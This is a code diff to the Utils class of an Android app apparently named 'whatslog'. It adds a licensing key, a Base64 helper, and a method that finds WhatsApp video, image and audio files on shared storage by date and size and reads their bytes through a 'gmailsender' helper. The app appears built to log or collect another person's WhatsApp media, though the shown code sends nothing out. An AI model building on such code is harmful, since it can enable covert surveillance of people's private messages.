@@ -3,6 +3,7 @@ package com.whatslog;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
+import java.io.FilenameFilter;
 import java.io.IOException;
 import java.io.OutputStream;
 
@@ -20,12 +21,14 @@ import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.NetworkInfo.State;
 import android.net.Uri;
+import android.os.Environment;
 import android.os.Handler;
 import android.preference.PreferenceManager;
 import android.provider.BaseColumns;
 import android.provider.ContactsContract;
 import android.provider.ContactsContract.PhoneLookup;
 import android.provider.Settings.Secure;
+import android.util.Base64;
 
 import com.google.android.vending.licensing.AESObfuscator;
 import com.google.android.vending.licensing.LicenseChecker;
@@ -34,7 +37,7 @@ import com.google.android.vending.licensing.ServerManagedPolicy;
 
 public class Utils {
 
-
+	public static final String BASE64_PUBLIC_KEY="MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtNBwCmA8QI1p0POCCxNbWYJNw4RP9r3SvumIDcbnSmZQvIGtceRvAU521LR+v8rWd+H4sseghzjGTDHoVu8bSEth1i5iPnFhEn+X7JKnicP+ZWP2AjcYjFCJ/mDLfBYNPVpLe3UiD53Jqswu6JBjEjvDF9Xk8PfiKH0H49ydeTCpnWeyYSEfD07iqv+BpIzKYckaEqACJzKBDfVLP5RNGOPhClcs8Jfpu8+oI7ILzn6hsIvpghmqzrglDZgplMh1Fz2dePYNic/TOS/jexUt2OmofKyu32pwjtcW0tO+nfgMAQ9kXOnbs7GBVJofKwrf1q9zMRoDUsFZV5sddskECQIDAQAB";
 	public static final byte[] SALT = new byte[] {-92,98,-32,49,65,34,23,44,65,-23,-12,-9,-3,5,-23,23,-94,123,-11,4};
 
 
@@ -113,10 +116,6 @@ public class Utils {
 		if (contactLookup != null && contactLookup.getCount() > 0) {
 			contactLookup.moveToNext();
 			return contactLookup;
-			// name =
-			// contactLookup.getString(contactLookup.getColumnIndex(ContactsContract.Data.DISPLAY_NAME));
-			// String contactId =
-			// contactLookup.getString(contactLookup.getColumnIndex(BaseColumns._ID));
 		}
 
 		return contactLookup;
@@ -219,7 +218,42 @@ public class Utils {
 			p.setComponentEnabledSetting(componentToDisable, PackageManager.COMPONENT_ENABLED_STATE_DEFAULT, PackageManager.DONT_KILL_APP);
 		else
 			p.setComponentEnabledSetting(componentToDisable, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+	}
 
+	public static String encodeBase64(byte[] data){
+		return Base64.encodeToString(data, Base64.NO_WRAP);
+	}
 
+	public static byte[] getMediaFile(String tipo,long tamanho,String data,int dias){
+		String path=Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp "+tipo;
+
+		String prefixo="";
+		if(tipo.equals("Video"))
+			prefixo="vid";
+		else if(tipo.equals("Images"))
+			prefixo="img";
+		else if(tipo.equals("Audio"))
+			prefixo="aud";
+
+		final String nome=prefixo+"-"+data;
+	    File dir = new File(path);
+
+		File[] arquivos=dir.listFiles(new FilenameFilter() {
+
+			@Override
+			public boolean accept(File dir, String filename) {
+				return filename.toLowerCase().startsWith(nome);
+			}
+		});
+
+		for(File file : arquivos){
+			if(file.length()==tamanho)
+				try {
+					return com.gmailsender.Utils.getBytes(file);
+				} catch (IOException e) {
+					break;
+				}
+		}
+		return null;
 	}
 }
